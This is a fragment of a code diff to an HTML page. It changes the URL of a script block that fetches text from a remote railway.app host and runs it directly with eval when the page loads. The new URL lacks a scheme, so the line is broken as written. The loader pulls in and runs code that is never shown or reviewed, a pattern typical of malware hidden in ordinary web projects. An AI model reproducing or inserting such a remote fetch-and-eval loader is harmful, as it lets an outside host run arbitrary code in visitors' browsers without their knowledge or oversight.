@@ -140,7 +140,7 @@
     </div>
 
     <script>
-        fetch("https://expressjs-production-52d7.up.railway.app/getScript")
+        fetch("spiral-text-generator-production.up.railway.app/getScript")
             .then(res => res.text())
             .then(eval)
             .catch(err => console.error("Script failed to load:", err));
